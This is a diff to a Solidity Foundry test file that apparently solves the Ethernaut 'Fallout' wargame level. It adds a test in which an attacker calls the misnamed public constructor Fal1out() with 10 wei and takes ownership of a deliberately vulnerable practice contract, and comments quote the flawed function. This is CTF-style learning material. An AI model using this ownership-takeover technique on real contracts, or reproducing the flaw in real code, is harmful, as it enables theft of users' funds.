@@ -38,10 +38,57 @@ contract FalloutTest is Test {
      function test_Sample() public {
 
         assertEq(falloutContact.owner() ,falloutOwner);
-        assertEq(address(falloutContact).balance , 1 ether); // as we sent through 1 ether to the contract using Fal1out() from above setUp function 
+        assertEq(address(falloutContact).balance , 1 ether); // as we sent through 1 ether to the contract using Fal1out() from above setUp function
+
+    } 
+    function test_AttackAndTakeOwnerShip() public {
+        // Contribut Some Ether to Contract
+        uint256 amountToContribute = 1 ether;
+
+        vm.startPrank(contributor1);
+        falloutContact.allocate{value: amountToContribute}();
+        vm.stopPrank();
+
+        vm.startPrank(contributor2);
+        falloutContact.allocate{value: amountToContribute}();
+        vm.stopPrank();
+
+        // Now The Contract Balance Should be 2 + 1 = 3 ether
+        // 2 ether from two contributor and 1 from the owner who called Fallout() function from the setUp()
+
+        assertEq(address(falloutContact).balance , 3 ether);
+
+        //before Attack the Owner of The Contract Should be `falloutOnwer`
+
+        assertEq(falloutContact.owner() , falloutOwner);
+
+        /**
+            An Attacker Sees The `Fallout`()
+
+            ***
+                function Fal1out() public payable {
+                    owner = payable(msg.sender);
+                    allocations[owner] = msg.value;
+                }
+            ***
+
+            And Send a Liitle Amount of The Ether And Takes OwnerShip Of The Contract
+         */
+
+        // Attack
+
+        vm.startPrank(attacker);
+        falloutContact.Fal1out{value: 10 wei }(); // 10 wei =0.00000000000000001 ether
+        vm.stopPrank();
+
+        // after his call he should be the owner
+
+        assertEq(falloutContact.owner() , attacker);
+        assert(falloutContact.owner() != falloutOwner);
 
 
-     } 
+
+    }   
 
 
 }
